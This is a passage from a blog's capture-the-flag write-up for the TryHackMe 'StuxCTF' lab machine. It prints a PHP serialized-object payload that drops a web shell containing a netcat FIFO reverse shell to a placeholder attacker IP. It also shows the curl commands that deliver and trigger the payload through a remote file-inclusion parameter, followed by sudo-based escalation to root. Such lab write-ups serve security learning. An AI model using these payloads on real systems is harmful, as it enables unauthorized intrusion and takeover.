            <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>div</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
          <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>div</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>nav</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;!--</span> <span style=color:#a6e22e>hint</span><span style=color:#f92672>:</span> <span style=color:#f92672>/?</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=</span> <span style=color:#f92672>--&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;jumbotron&#34;</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
				<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>center</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
					<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>h1</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Follow</span> <span style=color:#a6e22e>the</span> <span style=color:#a6e22e>white</span> <span style=color:#a6e22e>rabbit</span><span style=color:#f92672>..&lt;/</span><span style=color:#a6e22e>h1</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
				<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>center</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
            <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>div</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>div</span><span style=color:#f92672>&gt;</span>            <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/jquery-1.11.3.min.js&#34;</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/bootstrap.min.js&#34;</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
    <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>

</code></pre></div><h2 id=foothold---user>Foothold - User</h2>
<p>Analyzing the code, we can obtain some valuable information:</p>
<ul>
<li>A piece of the code it&rsquo;s creating a <code>class</code></li>
<li>The description of the room says: <em>&ldquo;Crypto, <strong>serealization</strong>, priv scalation and more &mldr;!"</em> Giving us a hint, maybe we can get Remote code execution through unsafe unserialize in PHP.</li>
</ul>
<p>For this, I searched for information on google, and I found a page explaining how to do it! <a href=https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/>Here&rsquo;s the link</a>.</p>
<p>So with this piece of code, we can get RCE!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>file</span> 
{
	<span style=color:#66d9ef>public</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;this_is_totally_not_a_shell.php&#39;</span>;
	<span style=color:#66d9ef>public</span> $data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;?php exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc  your_TUN0_IP 1337 &gt;/tmp/f&#39;) ?&gt;&#34;</span>;
}

$exploit <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>file</span>);
<span style=color:#66d9ef>echo</span> $exploit;
<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><p>This is what we are going to do:</p>
<ul>
<li>Run the php file, and save the code to a <code>.txt</code> file.</li>
<li>Go to the folder in our local machine, and create a simple web server with python <code>sudo python3 -m http.server 80</code>.</li>
<li>Go to the page, and in the <code>file</code> parameter we are going to put our <code>tun0</code> IP and the name of the .txt file.</li>
<li>Run <code>netcat</code> to handle the reverse shell.</li>
<li>Finally go to the file <code>this_is_totally_not_a_shell.php</code>.</li>
</ul>
<ol>
<li></li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ php exp.php &gt; not_a_shell.txt 
</code></pre></div><ol start=2>
<li></li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo python3 -m http.server <span style=color:#ae81ff>80</span>                                                                                 ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Serving HTTP on 0.0.0.0 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span>http://0.0.0.0:80/<span style=color:#f92672>)</span> ...
</code></pre></div><ol start=3>
<li></li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/<span style=color:#ae81ff>\?</span>file<span style=color:#ae81ff>\=</span>http://your_TUN0_IP/not_a_shell.txt
File no Exist!&lt;!DOCTYPE html&gt;
    &lt;head&gt;
        &lt;title&gt;StuxCTF&lt;/title&gt;
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</code></pre></div><ol start=4>
<li></li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
</code></pre></div><ol start=5>
<li></li>
</ol>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ curl http://stuxctf.thm/473150289372648955391313281766843507325770399840230051892039938856873289<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>77050807800832928198526567069446044422855055/this_is_totally_not_a_shell.php
</code></pre></div><p>Finally Profit.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
connect to <span style=color:#f92672>[</span>10.9.2.251<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.250.63<span style=color:#f92672>]</span> <span style=color:#ae81ff>57118</span>
/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
$ id
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
$ 
</code></pre></div><p>Perfect!
We have now a reverse shell with user <code>www-data</code>.</p>
<p>Let&rsquo;s upgrade it with python.</p>
<p>Now we can read the user&rsquo;s flag</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ cat user.txt 
<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</code></pre></div><h2 id=root>Root</h2>
<p>We ran <code>sudo -l</code> to see if the user&rsquo;s inside the sudoers, and we get the following output:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User www-data may run the following commands on ubuntu:
    <span style=color:#f92672>(</span>ALL<span style=color:#f92672>)</span> NOPASSWD: ALL
</code></pre></div><p>WOW!</p>
<p>We can get to root simply running <code>sudo su</code> !!!!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@ubuntu:/home/grecia$ sudo su
root@ubuntu:/home/grecia# cat /root/root.txt 
<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</code></pre></div><p>And we rooted the machine!</p>
<p>That&rsquo;s all from my side, hope you find this helpful!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/posts/thm-pre-security/>
<span class=button__icon>←</span>
<span class=button__text>Hack Your Way To Learn - THM</span>
</a>
</span>
<span class="button next">
<a href=/posts/develpy/>
<span class=button__text>Develpy - Write Up</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user">Lanfran02</div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>